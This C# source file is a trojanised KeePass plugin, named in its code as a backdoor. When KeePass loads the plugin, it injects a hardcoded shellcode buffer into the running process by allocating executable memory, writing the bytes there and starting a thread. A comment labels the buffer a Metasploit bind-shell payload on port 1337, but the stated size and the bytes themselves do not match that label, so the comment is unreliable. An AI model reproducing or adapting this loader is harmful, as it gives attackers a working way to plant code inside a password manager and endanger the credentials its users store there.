﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using KeePass.Plugins;
using System.Runtime.InteropServices;

namespace backdoor_keepass
{
    public sealed class SamplePluginExt : Plugin
    {
        [Flags]
        public enum AllocationType
        {
            Commit = 4096,
            Reserve = 8192,
            Decommit = 16384,
            Release = 32768,
            Reset = 524288,
            Physical = 4194304,
            TopDown = 1048576,
            WriteWatch = 2097152,
            LargePages = 536870912
        }
        public enum AllocationProtect : uint
        {
            PAGE_NOACCESS = 1u,
            PAGE_READONLY,
            PAGE_READWRITE = 4u,
            PAGE_WRITECOPY = 8u,
            PAGE_EXECUTE = 16u,
            PAGE_EXECUTE_READ = 32u,
            PAGE_EXECUTE_READWRITE = 64u,
            PAGE_EXECUTE_WRITECOPY = 128u,
            PAGE_GUARD = 256u,
            PAGE_NOCACHE = 512u,
            PAGE_WRITECOMBINE = 1024u
        }
        /* msf payload(shell_bind_tcp) > generate -t csharp
         * 
         * windows/shell_bind_tcp - 328 bytes
         * http://www.metasploit.com
         * VERBOSE=false, LPORT=1337, RHOST=0.0.0.0, 
         * PrependMigrate=false, EXITFUNC=thread, 
         * InitialAutoRunScript=, AutoRunScript=
         */
        byte[] buf = new byte[268] {
0xd9,0xeb,0x9b,0xd9,0x74,0x24,0xf4,0x31,0xd2,0xb2,0x77,0x31,0xc9,0x64,0x8b,
0x71,0x30,0x8b,0x76,0x0c,0x8b,0x76,0x1c,0x8b,0x46,0x08,0x8b,0x7e,0x20,0x8b,
0x36,0x38,0x4f,0x18,0x75,0xf3,0x59,0x01,0xd1,0xff,0xe1,0x60,0x8b,0x6c,0x24,
0x24,0x8b,0x45,0x3c,0x8b,0x54,0x28,0x78,0x01,0xea,0x8b,0x4a,0x18,0x8b,0x5a,
0x20,0x01,0xeb,0xe3,0x34,0x49,0x8b,0x34,0x8b,0x01,0xee,0x31,0xff,0x31,0xc0,
0xfc,0xac,0x84,0xc0,0x74,0x07,0xc1,0xcf,0x0d,0x01,0xc7,0xeb,0xf4,0x3b,0x7c,
0x24,0x28,0x75,0xe1,0x8b,0x5a,0x24,0x01,0xeb,0x66,0x8b,0x0c,0x4b,0x8b,0x5a,
0x1c,0x01,0xeb,0x8b,0x04,0x8b,0x01,0xe8,0x89,0x44,0x24,0x1c,0x61,0xc3,0xb2,
0x08,0x29,0xd4,0x89,0xe5,0x89,0xc2,0x68,0x8e,0x4e,0x0e,0xec,0x52,0xe8,0x9f,
0xff,0xff,0xff,0x89,0x45,0x04,0xbb,0x7e,0xd8,0xe2,0x73,0x87,0x1c,0x24,0x52,
0xe8,0x8e,0xff,0xff,0xff,0x89,0x45,0x08,0x68,0x6c,0x6c,0x20,0x41,0x68,0x33,
0x32,0x2e,0x64,0x68,0x75,0x73,0x65,0x72,0x30,0xdb,0x88,0x5c,0x24,0x0a,0x89,
0xe6,0x56,0xff,0x55,0x04,0x89,0xc2,0x50,0xbb,0xa8,0xa2,0x4d,0xbc,0x87,0x1c,
0x24,0x52,0xe8,0x5f,0xff,0xff,0xff,0x68,0x68,0x69,0x58,0x20,0x31,0xdb,0x88,
0x5c,0x24,0x02,0x89,0xe3,0x68,0x61,0x63,0x6b,0x58,0x68,0x65,0x73,0x20,0x62,
0x68,0x74,0x72,0x69,0x6b,0x68,0x6f,0x65,0x20,0x73,0x68,0x61,0x67,0x65,0x6a,
0x68,0x61,0x76,0x65,0x72,0x31,0xc9,0x88,0x4c,0x24,0x17,0x89,0xe1,0x31,0xd2,
0x6a,0x10,0x53,0x51,0x52,0xff,0xd0,0x31,0xc0,0x50,0xff,0x55,0x08 };

        [DllImport("Kernel32.dll")]
        private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param,
           UInt32 dwCreationFlags, ref UInt32 lpThreadId);

        [DllImport("Kernel32.dll")]
        private static extern IntPtr OpenProcess(uint lol, int int_0, int int_1);

        [DllImport("Kernel32.dll", ExactSpelling = true, SetLastError = true)]
        private static extern IntPtr VirtualAllocEx(IntPtr intptr_0, IntPtr intptr_1, IntPtr intptr_2, AllocationType allocationType_0, AllocationProtect allocationProtect_0);

        [DllImport("Kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
          byte[] lpBuffer, int dwSize, ref int lpNumberOfBytesWritten);
        private IPluginHost m_host = null;

        public override bool Initialize(IPluginHost host)
        {
            Terminate();
            System.Diagnostics.Process olo = System.Diagnostics.Process.GetCurrentProcess();
            int pid = olo.Id;
            IntPtr hProcess = OpenProcess(0x001F0FFF, 0, pid);
            if (hProcess == IntPtr.Zero)
            {
                throw new Exception("Could not open process ID " + pid + ", are you running as an admin?");
            }
            IntPtr intPtr = VirtualAllocEx(hProcess, IntPtr.Zero, (IntPtr)buf.Length,
            AllocationType.Commit | AllocationType.Reserve, AllocationProtect.PAGE_EXECUTE_READWRITE);
            int zero = 0;
            IntPtr kek = IntPtr.Zero;
            WriteProcessMemory(hProcess, intPtr, buf, buf.Length, ref zero);
            UInt32 tid = 0;
            CreateThread(0, 0, intPtr, kek, 0, ref tid);
            m_host = host;
            return true;
        }
        public override void Terminate()
        {
            // lol
        }
    }
}